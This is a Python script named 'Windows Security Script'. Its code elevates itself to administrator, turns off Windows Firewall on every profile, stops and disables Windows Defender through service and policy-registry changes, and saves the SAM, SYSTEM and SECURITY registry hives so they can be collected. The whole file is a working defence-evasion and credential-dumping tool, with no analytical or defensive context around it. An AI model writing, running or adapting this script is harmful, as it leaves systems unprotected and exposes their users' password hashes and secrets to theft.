#!/usr/bin/env python3
"""
Windows Security Script
This script runs with admin privileges, disables Windows Firewall and Defender,
and extracts SAM, SYSTEM, and SECURITY registry files.
"""

import os
import sys
import subprocess
import ctypes
import tempfile
import shutil
import time

def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_elevated():
    """Relaunch the script with administrator privileges"""
    if not is_admin():
        print("Requesting administrator privileges...")
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit(0)

def disable_windows_firewall():
    """Disable Windows Firewall"""
    print("Disabling Windows Firewall...")
    
    commands = [
        'netsh advfirewall set allprofiles state off',
        'netsh advfirewall set currentprofile state off',
        'netsh advfirewall set domainprofile state off',
        'netsh advfirewall set privateprofile state off',
        'netsh advfirewall set publicprofile state off'
    ]
    
    for cmd in commands:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                print(f"✓ {cmd}")
            else:
                print(f"✗ {cmd}: {result.stderr}")
        except Exception as e:
            print(f"Error executing '{cmd}': {e}")

def disable_windows_defender():
    """Disable Windows Defender"""
    print("Disabling Windows Defender...")
    
    # Stop Defender services
    services = [
        "WinDefend",
        "WdNisSvc",
        "Sense",
        "SecurityHealthService"
    ]
    
    for service in services:
        try:
            subprocess.run(f"net stop {service}", shell=True, capture_output=True, timeout=30)
            subprocess.run(f"sc config {service} start= disabled", shell=True, capture_output=True, timeout=30)
            print(f"✓ Disabled {service} service")
        except Exception as e:
            print(f"Error disabling {service}: {e}")
    
    # Disable Defender via registry
    reg_commands = [
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f'
    ]
    
    for cmd in reg_commands:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                print(f"✓ {cmd}")
            else:
                print(f"✗ {cmd}: {result.stderr}")
        except Exception as e:
            print(f"Error executing '{cmd}': {e}")

def extract_sam_files():
    """Extract SAM, SYSTEM, and SECURITY registry files"""
    print("Extracting SAM, SYSTEM, and SECURITY files...")
    
    # Create a temporary directory for extraction
    temp_dir = tempfile.mkdtemp()
    print(f"Extracting files to: {temp_dir}")
    
    # Files to extract
    registry_files = {
        "SAM": "C:\\sam.save",
        "SYSTEM": "C:\\system.save", 
        "SECURITY": "C:\\security.save"
    }
    
    # Commands to extract registry files
    commands = [
        'reg.exe save hklm\\sam "C:\\sam.save" /y',
        'reg.exe save hklm\\system "C:\\system.save" /y',
        'reg.exe save hklm\\security "C:\\security.save" /y'
    ]
    
    # Execute extraction commands
    for cmd in commands:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                print(f"✓ {cmd}")
            else:
                print(f"✗ {cmd}: {result.stderr}")
        except Exception as e:
            print(f"Error executing '{cmd}': {e}")
    
    # Copy files to temporary directory
    for name, path in registry_files.items():
        try:
            if os.path.exists(path):
                shutil.copy2(path, temp_dir)
                print(f"✓ Copied {name} to {temp_dir}")
            else:
                print(f"✗ {name} file not found at {path}")
        except Exception as e:
            print(f"Error copying {name}: {e}")
    
    return temp_dir

def main():
    """Main function"""
    print("=== Windows Security Script ===\n")
    print("This script will:")
    print("1. Run with administrator privileges")
    print("2. Disable Windows Firewall")
    print("3. Disable Windows Defender")
    print("4. Extract SAM, SYSTEM, and SECURITY registry files")
    print("\nStarting in 5 seconds...")
    time.sleep(5)
    
    # Request admin privileges
    run_elevated()
    
    # Check if we're admin (after elevation)
    if not is_admin():
        print("This script must be run with administrator privileges.")
        input("Press Enter to exit...")
        sys.exit(1)
    
    # Execute the main tasks
    print("\n" + "="*50)
    disable_windows_firewall()
    
    print("\n" + "="*50)
    disable_windows_defender()
    
    print("\n" + "="*50)
    extraction_dir = extract_sam_files()
    
    print("\n" + "="*50)
    print("Script execution completed!")
    print(f"Registry files extracted to: {extraction_dir}")
    print("\nFiles extracted:")
    if os.path.exists(extraction_dir):
        for file in os.listdir(extraction_dir):
            print(f"  - {file}")
    
    print("\nNote: Some security features might require a reboot to take full effect.")
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
